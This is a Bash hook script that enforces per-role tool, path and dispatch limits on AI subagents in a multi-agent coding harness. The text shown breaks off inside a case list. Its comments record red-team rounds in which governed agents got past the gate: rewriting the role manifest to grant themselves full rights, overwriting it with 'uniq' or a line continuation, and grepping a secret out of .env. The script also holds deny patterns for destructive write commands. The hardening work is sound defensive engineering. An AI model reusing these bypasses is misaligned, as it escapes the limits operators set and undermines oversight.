#!/bin/bash
# harness-os-role-gate.sh — the harness OS kernel: one generic hook that
#                           enforces every declared role's boundaries.
#
# CANONICAL HOME: github.com/civitas-cerebrum/harness-os
# Copies of this file in consumer repos (e.g. achilles) are vendored
# verbatim — edit upstream, then run the consumer's sync (for achilles:
# npm run sync:harness-os).
#
# Hook    : PreToolUse:.* (all tools — the gate routes internally)
# Mode    : DENY (fail-closed inside governed contexts; silent allow
#           everywhere the project has not opted in)
# State   : <repo-root>/.claude/harness-os.state/
#             dispatch-registry.json   role dispatches (TTL-pruned)
#             agents/<agent_id>        resolved role bindings
#             decision-log.jsonl       one line per deny (calibration)
# Env     : HARNESS_OS=0             operator kill-switch (design sessions)
#           HARNESS_OS_MANIFEST      manifest path override (tests)
#           HARNESS_OS_STATE_DIR     state dir override (tests)
#
# Why
# ---
# Multi-agent harnesses assign mandates by prose ("you are the reviewer;
# only read the acceptance criteria and the deliverable") — and prose
# does not bind. This gate reads the project's role manifest
# (.claude/harness-os.json, schema: schemas/harness-os.schema.json),
# resolves WHICH role the calling context is (main session vs dispatched
# subagent — see the resolution ladder in lib/harness-os.sh), and
# enforces the role's grants along these axes:
#
#   1. self-protection  — no governed context touches the manifest/state
#   2. tool gate        — tools.deny / tools.allow (shell-glob names)
#   3. bash gate        — every command segment must match the role's
#                         command groups; indirection constructs are
#                         denied unless bash.permit names them; redirect
#                         targets obey the write scope and file-naming
#                         tokens obey the read scope
#   4. read scope       — Read/Glob/Grep/NotebookRead path globs
#   5. write scope      — Write/Edit/NotebookEdit path globs (opt-in)
#   6. dispatch gate    — Agent calls: target role must be in the
#                         caller's dispatch list, description must be
#                         role-prefixed, prompt must carry the
#                         <<harness-os-role: NAME[#NONCE]>> binding tag;
#                         the dispatch (and its nonce) is recorded so the
#                         child binds exactly, even under parallel
#                         mixed-role dispatch
#   7. skill gate       — optional skills.allow over the Skill tool
#   8. MCP arg scoping  — path arguments named in
#                         settings.mcpPathArguments obey the read/write
#                         scopes; unmapped MCP tools stay name-gated
#
# The same enforcement therefore serves ANY harness a manifest can
# describe — the manifest is the harness; this hook is the kernel.
# The permission boundary doubles as context hygiene: a reviewer that
# CANNOT read outside docs/acceptance/** + the deliverable never loads
# unrelated files into its context window.
#
# Canonical reference
# -------------------
# skills/harness-designer/references/architecture.md
# skills/harness-designer/SKILL.md            (onboarding flow)
# schemas/harness-os.schema.json              (manifest contract)
#
# Failure → action
# ----------------
# Axis violation → DENY with the role's mandate, the violated grant, and
# the sanctioned alternative. Manifest present but unparseable → DENY
# mutating tools, allow the read path (so it can be repaired).

set -uo pipefail

# An internal error must not read as permission. `set -u` turns a typo or
# an out-of-scope variable into an immediate exit, and an exit with no
# JSON on stdout is how this hook says "allow" — so a bug in the kernel
# silently disabled the kernel. Found while adding a check that referenced
# a variable set only on the Bash path: the hook died and the call went
# through. A gate whose failure mode is ALLOW is not a gate.
#
# HOS_DECIDED is set the moment a real verdict is emitted, so a normal
# allow (which is a deliberate `exit 0` before this trap can fire) and a
# deny are both left alone. Anything else exits non-zero with an
# explanation, which the harness surfaces rather than treating as consent.
HOS_DECIDED=0
harness_os__on_exit() {
  local code=$?
  if [ "$code" -eq 0 ] && [ "${HOS_DECIDED:-0}" != "1" ]; then
    # AN ALLOW LEAVES NO TRACE, and round 43 pointed out what that means
    # for a system whose value proposition is a trustworthy verdict: the
    # decision log is written from exactly one place — the deny renderer
    # — so it records refusals and nothing else. Every SUCCESSFUL
    # boundary breach in this document's hundred-and-twenty escapes
    # would have been invisible in it. The log evidences what was
    # stopped, never what got through.
    #
    # Logging every allow is a lot of lines for a busy session, so it is
    # opt-in — but the opt-in belongs in the manifest and the default
    # belongs in the docs, honestly stated, rather than in a claim that
    # the log holds "one line per decision".
    #
    # Written HERE rather than at each allow, because there are a dozen
    # `exit 0` sites and a rule attached to a site is a rule that will be
    # applied at one site. The trap sees them all.
    if [ "${HOS_LOG_ALLOWS:-0}" = "1" ]; then
      harness_os_log allow "${HOS_TOOL:-?} ${HOS_ALLOW_DETAIL:-}" 2>/dev/null || true
    fi
    return 0
  fi
  [ "$code" -eq 0 ] && return 0
  [ "${HOS_DECIDED:-0}" = "1" ] && return 0
  printf '%s\n' "[harness-os] INTERNAL ERROR: the role gate exited $code before reaching a decision." >&2
  printf '%s\n' "[harness-os] Refusing to treat that as permission. Re-run with bash -x to see where, or set HARNESS_OS=0 to bypass the kernel deliberately." >&2
  exit "$code"
}
trap harness_os__on_exit EXIT

INPUT=$(cat)

JQ="$(dirname "${BASH_SOURCE[0]}")/bin/jq"
[ -x "$JQ" ] || JQ="$(command -v jq || true)"
if [ -z "$JQ" ]; then
  # jq is how this kernel reads both the payload and the manifest, so
  # without it there is no enforcing anything. What that should MEAN,
  # though, depends on whether this project is governed at all — and the
  # blanket `exit 1` here answered for both cases at once, wrongly in
  # each direction. It broke every ungoverned project the hook happened
  # to be installed over, which is how a globally-installed hook gets
  # uninstalled; and the kill-switch could not rescue it, so the one
  # documented way out did not work when it was most needed.
  case "${HARNESS_OS:-}" in
    0|false|off) exit 0 ;;
  esac
  # Which project this is comes from the payload's cwd, and reading the
  # payload is the thing we cannot do. Pull that one field out with sed
  # rather than guessing from this process's directory, which is the
  # hook runner's and need not be the project's. If even that fails the
  # fallback errs toward denying: an unnecessary refusal is loud, names
  # its own remedy, and can be waved through with HARNESS_OS=0, whereas
  # guessing "ungoverned" hands back a project with nothing enforced and
  # no sign of it.
  HOS_PROBE_CWD=$(printf '%s' "$INPUT" \
    | sed -n 's/.*"cwd"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -n 1)
  [ -n "$HOS_PROBE_CWD" ] && [ -d "$HOS_PROBE_CWD" ] || HOS_PROBE_CWD="$PWD"
  HOS_PROBE="${HARNESS_OS_MANIFEST:-$( { cd "$HOS_PROBE_CWD" 2>/dev/null && git rev-parse --show-toplevel 2>/dev/null; } || printf '%s' "$HOS_PROBE_CWD" )/.claude/harness-os.json}"
  if [ ! -f "$HOS_PROBE" ]; then
    exit 0   # no manifest: this project never opted in, and jq is not its problem
  fi
  # A manifest IS present. Saying nothing here would leave every role in
  # it unenforced, silently, because a dependency is missing.
  HOS_DECIDED=1
  printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"[BLOCKED] harness-os cannot enforce this project: jq is not installed, and jq is how the kernel reads both the role manifest and the call it is deciding about. This project HAS a manifest, so treating the kernel as absent would leave every role unenforced without saying so. Install jq (https://jqlang.github.io/jq/), or set HARNESS_OS=0 to run this session ungoverned on purpose."}}'
  exit 0
fi

# shellcheck source=lib/harness-os.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib/harness-os.sh"

harness_os_load "$INPUT" || exit 0   # project has not opted in — silent allow

# settings.decisionLog: "denies" (default) | "all". See the exit trap.
HOS_LOG_ALLOWS=0
if [ "$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r '.settings.decisionLog // "denies"' 2>/dev/null || echo denies)" = "all" ]; then
  HOS_LOG_ALLOWS=1
fi
HOS_ALLOW_DETAIL=$(printf '%s' "$INPUT" | "$JQ" -r '
  .tool_input.command // .tool_input.file_path // .tool_input.path // .tool_input.url // .tool_input.description // empty' 2>/dev/null || echo "")

MANIFEST_REF="Manifest: ${HOS_MANIFEST}
Docs:     skills/harness-designer/references/architecture.md"

# search_pattern_offender — ONE DECISION, ONE PLACE, for the question
# "does this Glob/Grep pattern climb out of the search root?". Sets
# SEARCH_PAT to the first offending pattern field, or empty.
#
# It was written once, inside the GOVERNED Glob|Grep arm, and the
# unbound arm — a second channel doing the same job for callers the
# kernel could not identify — never got a copy. That is round 22's
# sentence for the fourth time, so this is a function now and both arms
# call it. Each renders its own deny, because the two audiences differ.
search_pattern_offender() {
  local sp_fields sp_cand
  SEARCH_PAT=""
  # Glob's `pattern` IS a path glob, so it counts there; for Grep the
  # pattern is a regex over CONTENT and only `glob` names paths.
  if [ "$HOS_TOOL" = "Glob" ]; then
    sp_fields=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.pattern // empty, .tool_input.glob // empty' 2>/dev/null)
  else
    sp_fields=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.glob // empty' 2>/dev/null)
  fi
  while IFS= read -r sp_cand; do
    [ -n "$sp_cand" ] || continue
    case "$sp_cand" in
      */..|*/../*|../*|..) SEARCH_PAT="$sp_cand" ;;   # climbs out of the root
      /*|"~"*)             SEARCH_PAT="$sp_cand" ;;   # absolute / home — ignores the root
    esac
    [ -n "$SEARCH_PAT" ] && break
  done <<< "$sp_fields"
}


# ---------------------------------------------------------------------------
# Broken manifest — fail closed on mutation, open on inspection/repair.
# ---------------------------------------------------------------------------
if [ "${HOS_MANIFEST_BROKEN:-0}" = "1" ]; then
  case "$HOS_TOOL" in
    Read|Glob|Grep|NotebookRead|TaskGet|TaskList) exit 0 ;;
    Write|Edit)
      # Permit repairing the manifest itself; deny other writes.
      #
      # But never from a ROLE-BOUND agent. "The manifest is broken" is a
      # state an agent can cause, not only one it can find: round 15
      # corrupted the manifest through a write channel this kernel did
      # not model, then walked through this very branch to install a
      # manifest granting itself everything — from a role holding
      # neither write grants nor the Write tool. Repair was the last step
      # of a privilege escalation, not a favour to an operator.
      #
      # An agent carrying a binding has a role because somebody decided
      # what it may do. Losing the file that records that decision must
      # not promote it. The operator, and an unbound main session, can
      # still repair; a dispatched subagent is told to hand it back.
      FILE_PATH=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.file_path // empty' 2>/dev/null || echo "")
      if [ "$FILE_PATH" = "$HOS_MANIFEST" ]; then
        HOS_REPAIR_BOUND=0
        if [ -n "${HOS_AGENT_ID:-}" ] && [ -f "$(harness_os__binding_file "$HOS_AGENT_ID")" ]; then
          HOS_REPAIR_BOUND=1
        fi
        if [ "$HOS_REPAIR_BOUND" = "0" ]; then exit 0; fi
        harness_os_deny "broken-manifest-repair-by-bound-agent" "[BLOCKED] The harness OS manifest is not valid JSON, and this call comes from an agent bound to a role — so it may not be the one to rewrite it.

${MANIFEST_REF}

The manifest is the record of what each role may do. An agent that HAS a role has one because somebody decided what it may do, and losing that file must not be a way to decide differently. A broken manifest is also a state an agent can cause, so repairing it from inside a bound role would turn any write channel into a way to grant itself anything.

Hand this back to the orchestrator or the operator, who can repair the manifest outside a bound role — or disable the kernel deliberately with HARNESS_OS=0."
      fi
      ;;
  esac
  harness_os_deny "broken-manifest tool=$HOS_TOOL" "[BLOCKED] The harness OS manifest exists but is not valid JSON, so no role's grants can be verified.

${MANIFEST_REF}

While the manifest is broken the kernel fails closed: only read tools and a Write/Edit that repairs the manifest itself are permitted. Fix the manifest (validate against schemas/harness-os.schema.json) or have the operator disable the harness OS for this session with HARNESS_OS=0 in their shell."
fi

harness_os_resolve_role

# ---------------------------------------------------------------------------
# Ungoverned context (no manifest role applies) — the operator's design
# surface. Silent allow.
# ---------------------------------------------------------------------------
[ "$HOS_ROLE_STATE" = "ungoverned" ] && exit 0

# ---------------------------------------------------------------------------
# Unbound subagent — identity could not be resolved (mixed-role parallel
# dispatch on a build without parent_tool_use_id / per-child transcripts).
# ---------------------------------------------------------------------------
if [ "$HOS_ROLE_STATE" = "unbound" ]; then
  POLICY=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r '.settings.unboundAgentPolicy // "readonly"' 2>/dev/null || echo "readonly")
  case "$POLICY" in
    allow) exit 0 ;;
    readonly)
      case "$HOS_TOOL" in
        TaskGet|TaskList) exit 0 ;;
        Read|Glob|Grep|NotebookRead)
          # "readonly" used to mean UNSCOPED reads, which reads as safer
          # than it is: an unbound agent could Read .env and every
          # confidential file in the project, because with no role there
          # was no scope to hold it to. A reviewer flagged the wording
          # gap; the honest fix is to give it a scope. An unbound agent
          # is held to the UNION of every role's read.allow — it may see
          # what some role in this OS is allowed to see, and nothing
          # else. Material no role may read stays unreachable to a caller
          # the kernel could not even identify.
          UNBOUND_SCOPE=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -c '[.roles[]?.read.allow[]?] | unique' 2>/dev/null || echo "[]")
          if [ "$UNBOUND_SCOPE" = "[]" ] || [ "$UNBOUND_SCOPE" = "null" ]; then exit 0; fi
          UNBOUND_TARGET=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.file_path // .tool_input.notebook_path // .tool_input.path // empty' 2>/dev/null || echo "")
          # A SEARCH THAT NAMES NO PATH RUNS FROM THE ROOT, and this
          # branch used to `exit 0` on it — no path field, nothing to
          # check, ALLOW. So `Grep pattern:"SMTP_PASSWORD"` with no
          # `path` returned the line out of .env to a caller the kernel
          # could not identify, while the identical call WITH
          # `path:".env"` was correctly denied. The union scope was
          # enforced only when a path happened to be present.
          #
          # Round 28 found it and it refutes round 27's own closing note
          # in this document, which judged the union scope "bounded away
          # from the planted secrets". That was true of the path-bearing
          # channel only.
          #
          # The rule "no path means the root, so scope-check the root"
          # is the governed arm's, held since round 1, and round 24 put
          # it on the Bash channel too. This is the third channel, and
          # the fourth time this project has written the same sentence:
          # a rule attached to a channel exists once per channel. The
          # branch whose entire job is to be a floor under callers that
          # could not be identified was the one still answering "no
          # modelled field, therefore allow".
          [ -n "$UNBOUND_TARGET" ] || UNBOUND_TARGET="$HOS_ROOT"
          # ...and a pattern that climbs out of the root evades the check
          # on the root itself, which the governed twin has always known.
          search_pattern_offender
          if [ -n "$SEARCH_PAT" ]; then
            harness_os_deny "unbound search-pattern-traversal" "[BLOCKED] This subagent's harness-OS role could not be resolved, and its $HOS_TOOL pattern ('$SEARCH_PAT') climbs out of the project root.

${MANIFEST_REF}

unboundAgentPolicy is \"readonly\", which permits reading only what some role in this OS may read. A pattern is applied under the search root, so one that escapes upward is not a search of anything this OS has a scope for."
          fi
          harness_os_is_manifest_path "$UNBOUND_TARGET" && exit 0
          UNBOUND_REL=$(harness_os_relpath "$UNBOUND_TARGET")
          harness_os_path_in_scope "$UNBOUND_REL" "$UNBOUND_SCOPE" && exit 0
          harness_os_deny "unbound read-out-of-scope $UNBOUND_REL" "[BLOCKED] This subagent's harness-OS role could not be resolved, and '$UNBOUND_REL' is outside every role's read scope.

${MANIFEST_REF}

unboundAgentPolicy is \"readonly\", which permits reading only what some role in this OS is allowed to read — not the whole project. Material no role may see stays out of reach of a caller the kernel cannot identify.

Re-dispatch this task with a role-prefixed description (\"<role>-<slug>: ...\") and the binding tag <<harness-os-role: NAME#nonce>> as the first line of the prompt, and the role's own read scope applies instead."
          ;;
      esac
      ;;
  esac
  harness_os_deny "unbound tool=$HOS_TOOL policy=$POLICY" "[BLOCKED] This subagent's harness-OS role could not be resolved, and the manifest's unboundAgentPolicy (\"$POLICY\") does not permit '$HOS_TOOL'.

${MANIFEST_REF}

A subagent binds to a role when its dispatch carried a role-prefixed description (\"<role>-<slug>: ...\") and the prompt embedded the binding tag <<harness-os-role: NAME>>. When several DIFFERENT roles are dispatched at once, give each dispatch tag a unique nonce — <<harness-os-role: NAME#a1b2c3>> — so every child binds exactly. Return now and let the orchestrator re-dispatch this task with a properly tagged brief."
fi

# ---------------------------------------------------------------------------
# Governed context — enforce the role's grants.
# ---------------------------------------------------------------------------
ROLE="$HOS_ROLE"
ROLE_DESC=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r --arg r "$ROLE" '.roles[$r].description // ""' 2>/dev/null || echo "")
ROLE_HEADER="Role:     ${ROLE} — ${ROLE_DESC}
${MANIFEST_REF}"

# Every path scope in this kernel is relative to the directory the call
# runs in. If that directory does not exist, no relative path can be
# resolved and no scope can be applied — and the axes then find nothing
# to object to, which reads as permission. That is the wrong direction
# for the same reason a `cd` elsewhere is denied: a scope you cannot
# evaluate is not a scope you may skip.
#
# A RELATIVE cwd is the same problem wearing a disguise, and worse for
# being quiet: the scopes still resolve, just against whatever directory
# this hook process happens to be in rather than the agent's. Every
# verdict downstream is then computed about the wrong tree — sometimes
# denying honest work, sometimes clearing a path that was never in
# scope, and never announcing which. Scoping that silently answers about
# somewhere else is worse than scoping that refuses.
case "$HOS_CWD" in
  /*) [ -d "$HOS_CWD" ] || HOS_CWD_FAULT="does not exist" ;;
  *)  HOS_CWD_FAULT="is not an absolute path" ;;
esac
if [ -n "${HOS_CWD_FAULT:-}" ]; then
  harness_os_deny "cwd-unresolvable $HOS_CWD" "[BLOCKED] Role '${ROLE}' made a call whose working directory ('$HOS_CWD') ${HOS_CWD_FAULT}, so none of this role's path scopes can be evaluated against it.

${ROLE_HEADER}

Read and write scopes are relative to the directory a call runs in. Without a directory to resolve them against — or with one this kernel would have to guess at — there is nothing to compare a path to, and a scope that cannot be evaluated is refused rather than skipped."
fi

# --- Axis 1: self-protection --------------------------------------------
# The manifest and the kernel's state dir are the root of trust; no
# governed role may mutate them through any channel. Changes go through
# an operator design session (HARNESS_OS=0) or a hand edit.
SELF_PROTECT_MSG="[BLOCKED] Role '${ROLE}' attempted to modify the harness OS itself.

${ROLE_HEADER}

The manifest, .claude/harness-os.state/, and the project's .claude/settings*/hooks (which register this kernel) are the root of trust for every role boundary — no governed role may change them, whatever its other grants. To redesign the harness: ask the operator to relaunch with HARNESS_OS=0 (or edit the manifest outside the session), ideally via the harness-designer skill."

NORM_MANIFEST="$(harness_os_normalize_path "$HOS_MANIFEST")"
NORM_STATE_DIR="$(harness_os_normalize_path "$HOS_STATE_DIR")"

# harness_os_self_protect <path> <log-prefix>
# Refuses a write to the harness OS itself: the manifest, the state
# directory, this project's .claude config and hooks, and the installed
# kernel wherever it lives.
#
# ONE COPY. There were two — one for Write/Edit, one for Bash write
# targets — and they had already drifted: the Bash copy was missing the
# bare `.claude/hooks` entry the other had. Round 13 made this argument
# about the read scan's positional-program exemption; it is the same
# argument. A rule duplicated per channel is a rule that will differ per
# channel, and the difference is discovered by a reviewer rather than by
# its authors.
#
# And it is now called from THREE channels, because round 22 found the
# third. Self-protection had been attached to tool NAMES — the
# `Write|Edit|NotebookEdit` arm and the `Bash` arm — rather than to the
# act of writing, so a mapped MCP write tool reached the manifest, the
# role bindings and the hook registration untouched by any of it. The
# axis that maps MCP path arguments held them to the role's write scope
# and stopped there, and a config role whose scope legitimately covers
# `.claude/**` could therefore rewrite the file that says what it may do.
# prot_reader_flag <token> — true when the token is a FLAG whose operand
# the tool only ever READS. The manifest is readable by design: it is the
# law each role is held to, so naming it after one of these is ordinary.
prot_reader_flag() {
  case "$1" in
    -f|--file|--from-file|-K|--config|--rawfile|--slurpfile|-L|\
    -T|--upload-file|-e|--regexp|--exclude-from|--include-from|\
    --files0-from|-a|--arg-file|--input-file|--manifest) return 0 ;;
  esac
  return 1
}

self_protect_target() {
  local sp_path="$1" sp_prefix="${2:-self-protect write}" sp_norm sp_rel
  [ -n "$sp_path" ] || return 0
  sp_norm="$(harness_os_normalize_path "$sp_path")"
  # THE FILESYSTEM DECIDES WHAT IS THE SAME FILE, AND ON TWO OF THE THREE
  # PLATFORMS THIS SHIPS TO IT DOES SO WITHOUT REGARD TO CASE. Every
  # comparison below is a glob against a literal, which is case-SENSITIVE
  # in shell. On macOS and Windows `tests/e2e/.CLAUDE/settings.json` and
  # `tests/e2e/.claude/SETTINGS.json` open the same bytes as the file
  # this axis exists to protect — the one carrying the hook registration
  # — and both walked straight through. Found by probing round 44's own
  # fix; latent on the Linux benchmark, live on a laptop.
  #
  # The protected NAMES are all ASCII, so folding the path for the
  # comparison costs nothing and cannot under-match. It can over-match:
  # on Linux a genuinely distinct `.CLAUDE/settings.json` is now refused
  # too. That file is not law on Linux, but nothing writes it either,
  # and this is the direction to be wrong in.
  local sp_fold
  sp_fold=$(printf '%s' "$sp_norm" | tr 'A-Z' 'a-z')
  case "$sp_norm" in
    "$NORM_MANIFEST"|"$NORM_STATE_DIR"|"$NORM_STATE_DIR"/*)
      harness_os_deny "$sp_prefix $sp_path" "$SELF_PROTECT_MSG" ;;
  esac
  sp_rel="$(harness_os_relpath "$sp_path" | tr 'A-Z' 'a-z')"
  case "$sp_rel" in
    .claude/harness-os.json|.claude/harness-os.state|.claude/harness-os.state/*|.claude/settings.json|.claude/settings.local.json|.claude/hooks|.claude/hooks/*)
      harness_os_deny "$sp_prefix $sp_path" "$SELF_PROTECT_MSG" ;;
  esac

  # SELF-PROTECTION GUARDED THE MANIFEST IT WAS TOLD ABOUT; DISCOVERY
  # OBEYS THE NEAREST ONE TO THE CWD. Round 27 made the loader walk UP
  # from cwd and stop at the first `.claude/harness-os.json`, on purpose,
  # so a project nested inside a larger repo is governed by its own law.
  # This axis kept matching the ROOT-relative literals above and the one
  # `NORM_MANIFEST` — so `tests/e2e/.claude/harness-os.json` matched
  # neither, and round 44 had the bench's real composer, whose write
  # scope is `tests/e2e/**`, author a manifest granting itself
  # `bash.unrestricted` and `read: ["**"]`. Any call rooted at or below
  # that directory is then governed by the file the governed role wrote.
  # A role minting its own law is the one thing this axis exists to make
  # impossible, and it advertises exactly that: "no governed role may
  # change it, whatever its other grants."
  #
  # The Bash channel had it right the whole time. Its PROT_RE matches a
  # `.claude` segment ANYWHERE in the path, so `echo {} >
  # tests/e2e/.claude/harness-os.json` was already refused while the
  # identical Write was allowed. Same act, two channels, guarded on one:
  # the copies drifted, which is the defect recorded here under four
  # other names. This brings Write/Edit/NotebookEdit and the mapped MCP
  # write into parity with the channel that was already strict, rather
  # than inventing a third spelling of the rule.
  #
  # It is the same CHILDREN as the root-relative list above, generalised
  # by depth — not the whole `.claude` directory. The first cut of this
  # fix took the Bash channel's rule wholesale, and the suite caught it
  # within the hour: round 22's `config-keeper` has `.claude/**` as its
  # legitimate write scope, and blanketing the directory took away
  # `.claude/notes.md`, which is simply that role's job. The Bash copy is
  # broader because it is a text scan over a command line and cannot
  # tell a target from a mention; a channel that receives the path as a
  # structured field can afford to be exact, and should be. Widening a
  # self-protection axis until it eats ordinary work is how a manifest
  # acquires `bash.unrestricted`, which this document argues is the more
  # dangerous half.
  case "$sp_fold" in
    */.claude/harness-os.json \
    |*/.claude/harness-os.state|*/.claude/harness-os.state/* \
    |*/.claude/settings.json|*/.claude/settings.local.json \
    |*/.claude/hooks|*/.claude/hooks/*)
      harness_os_deny "$sp_prefix nested-config $sp_path" "$SELF_PROTECT_MSG" ;;
  esac
  # A manifest filename outside any `.claude` directory is not law today
  # — discovery only ever looks at `<dir>/.claude/harness-os.json` — but
  # the Bash channel has refused it since round 13, no ordinary work
  # produces one, and the cost of the two channels disagreeing again is
  # this whole finding a second time.
  case "${sp_fold##*/}" in
    harness-os.json|harness-os.state)
      harness_os_deny "$sp_prefix nested-manifest $sp_path" "$SELF_PROTECT_MSG" ;;
  esac
  # The INSTALLED kernel is the root of trust wherever it lives. A
  # project-local install sits in node_modules, which no self-protect
  # list covered — a role could truncate the hook and disable every
  # boundary on the next call.
  case "$sp_fold" in
    */harness-os/hooks/*|*/.claude/hooks/*|*/harness-os-role-gate.sh|*/lib/harness-os.sh)
      harness_os_deny "$sp_prefix kernel $sp_path" "$SELF_PROTECT_MSG" ;;
  esac
}

case "$HOS_TOOL" in
  Write|Edit|NotebookEdit)
    TARGET=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.file_path // .tool_input.notebook_path // empty' 2>/dev/null || echo "")
    if [ -n "$TARGET" ]; then
      self_protect_target "$TARGET" "self-protect write"
    fi
    ;;
  Bash)
    CMD=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.command // empty' 2>/dev/null || echo "")
    # Mention of the manifest/state — or of the .claude config dir that
    # holds them — in a write-shaped command → deny. Reads pass to the
    # normal bash axis. Quote-blind, protective direction: `rm -rf
    # .claude` must not escape just because it never says "harness-os".
    # The protected path must be the TARGET of the mutation, not merely
    # mentioned somewhere in the command. Matching any command that named
    # `.claude` and contained a write verb anywhere blocked innocuous
    # work like `echo see .claude/settings.json > tests/e2e/notes.txt`.
    # Matched case-INSENSITIVELY, for the reason self_protect_target
    # folds its own comparisons: on macOS and Windows `.CLAUDE/` and
    # `SETTINGS.json` name the same bytes as the protected file, and a
    # case-sensitive regex is a spelling of the protected path that
    # nobody checked. `-i` here can only ever protect more.
    PROT_RE='(harness-os\.(json|state)|(^|[^a-zA-Z0-9_.-])\.claude(/|$)|(^|[^a-zA-Z0-9_.-])\.claude/(settings(\.local)?\.json|hooks)(/|$))'
    if printf '%s' "$CMD" | grep -Eqi ">>?[[:space:]]*[^[:space:]|&;]*${PROT_RE}"; then
      harness_os_deny "self-protect bash redirect" "$SELF_PROTECT_MSG"
    fi
    if printf '%s' "$CMD" | grep -Eqi "(^|[;&|][[:space:]]*|[[:space:]])(rm|rmdir|unlink|mv|cp|tee|truncate|shred|dd|install|ln|chmod|chown)([[:space:]]+(-[^[:space:]]+|if=[^[:space:]]+))*[[:space:]]+[^;|&]*${PROT_RE}"; then
      harness_os_deny "self-protect bash mutate" "$SELF_PROTECT_MSG"
    fi
    if printf '%s' "$CMD" | grep -Eqi "sed[[:space:]]+-[a-zA-Z]*i[^;|&]*${PROT_RE}"; then
      harness_os_deny "self-protect bash sed-i" "$SELF_PROTECT_MSG"
    fi
    # A protected path carried by an OPERAND is a write until shown
    # otherwise. Round 15 overwrote the manifest with `curl -D <path>`,
    # and "which flags write?" has now been answered wrongly four times
    # — cp/mv/dd, then `sort -o`, then `find -fprintf`, then curl's
    # eight. Each answer was a longer list, and the next tool kept
    # arriving. Round 45 answered it wrongly a fifth time, and not with
    # a flag at all:
    #
    #     uniq [OPTION]... [INPUT [OUTPUT]]
    #     uniq docs/acceptance/registration.md .claude/harness-os.json
    #
    # uniq's SECOND POSITIONAL operand is an output file. The whole
    # inversion below had been applied to flags and never to bare
    # operands, so the write-target table — a list of the verbs somebody
    # remembered — decided this one, and it did not name `uniq`. No
    # write check ran, and the manifest then sailed through the READ
    # scan as an ordinary readable operand, because the manifest is
    # read-exempt for every role by design: it is the law each role is
    # held to. The one path the read side is told to wave through is the
    # one path the write side must never miss. `uniq` is in the DEFAULT
    # inspection group of every shipped manifest, and the bench's
    # `inspector` — a role with no write grants at all — overwrote the
    # root of trust with it.
    #
    # So the question is inverted for both shapes at once: an operand
    # naming one of the protected paths is a write unless the command is
    # a program whose operands are provably only ever read, or the flag
    # carrying it is a known reader flag. An unmodelled output operand
    # fails closed on arrival rather than on the round that finds it.
    #
    # One pass, per segment, because the command word is what decides
    # and a command word belongs to a segment. It also fixes a false
    # positive the whole-command version had: `head -5 .claude/…` was
    # refused, because `-5` is not a reader FLAG — though `head` has no
    # write flag to worry about in the first place.
    #
    # Tokenised here rather than reusing the segment loop's SEG_WORDS,
    # which runs later and is skipped for a role with bash.unrestricted
    # — self-protection is the one axis that holds whatever the role's
    # other grants say. Quotes are stripped and the command is cut at
    # shell separators; a coarse split is sound in the protective
    # direction, since a token it misreads is a token still checked.
    if [ -n "$CMD" ] && printf '%s' "$CMD" | grep -Eqi "$PROT_RE"; then
      #
      # THE TEXT PATTERN IS A PREFILTER; THE VERDICT IS BY RESOLUTION.
      # The first cut of this scan denied on the pattern itself, and the
      # benchmark replay caught what that costs: `.claude` appears in
      # paths that have nothing to do with this project's law —
      # `/root/.claude/projects/…` is Claude Code's own state directory,
      # and a role reading one was suddenly told it had "attempted to
      # modify the harness OS itself". The verdict was right by accident
      # (those commands were denied on another axis) and the reason was
      # a lie, which is the shape that teaches an operator to widen a
      # grant that was never the problem.
      #
      # So each candidate token goes to `self_protect_target`, the same
      # function the Write, Edit and MCP channels use: it normalises the
      # path and compares it against THIS project's manifest, state dir
      # and installed kernel. One rule, four channels, decided where the
      # path actually lands rather than where it looks like it lands.
      #
      # LINE CONTINUATIONS ARE JOINED FIRST, because the shell joins
      # them and this scan must see what the shell will run. Probing
      # this rule an hour after writing it found the bypass: a trailing
      # backslash-newline put the protected operand on a line of its
      # own, which arrived here as a ONE-WORD segment, and a one-word
      # segment was skipped as having no operands to check —
      #
      #     uniq docs/acceptance/registration.md \
      #     .claude/harness-os.json                     ->  ALLOW
      #
      # — which is the same command as the denied one, spelled the way
      # anyone writes a long command line. Two spellings of one act, one
      # checked, in the fix for two spellings of one act.
      __psegs=$(printf '%s' "$CMD" | tr -d "\"'" | sed -E ':a;/\\$/{N;s/\\\n//;ba}' | sed -E 's/[;&|]+/\n/g')
      while IFS= read -r __pseg; do
        [ -n "$__pseg" ] || continue
        # shellcheck disable=SC2206
        __pwords=( $__pseg )
        [ "${#__pwords[@]}" -ge 1 ] || continue
        __pcmd="${__pwords[0]}"
        # A segment whose COMMAND WORD is a protected path is an attempt
        # to execute the manifest, the state dir or the kernel. Nothing
        # legitimate does that, and skipping it was how the continuation
        # bypass stayed invisible.
        if printf '%s' "$__pcmd" | grep -Eqi "$PROT_RE"; then
          self_protect_target "$__pcmd" "self-protect bash command-word"
        fi
        __pcmd="${__pcmd##*/}"
        case "$__pcmd" in
          # Programs with no way to write a path they are handed —
          # neither by operand nor by flag. `echo`/`printf`/`:` are here
          # because their operands are TEXT, never paths at all: round 2
          # fixed `echo see .claude/settings.json > tests/e2e/notes.txt`
          # as a false positive once already, and a rule that reads every
          # operand as a path re-opens it. The redirect scan above still
          # decides where their output lands.
          #
          # Note who is NOT here: `uniq`
          # (second operand is output), `tee` and `split` (operands are
          # output), `csplit` (writes by prefix), `curl` and `wget`
          # (round 15). `sort` IS here: its writing form is the flag
          # `-o`, which the mutate scan above already refuses, and
          # refusing `sort .claude/…` outright would be a false positive
          # with no attack behind it.
          echo|printf|:|true|false|test|expr|\
          cat|head|tail|grep|egrep|fgrep|rg|ag|ack|jq|yq|wc|nl|od|xxd|hexdump|\
          file|stat|realpath|readlink|dirname|basename|ls|du|less|more|column|\
          cmp|diff|comm|md5sum|sha1sum|sha256sum|sha512sum|cksum|b2sum|sum|\
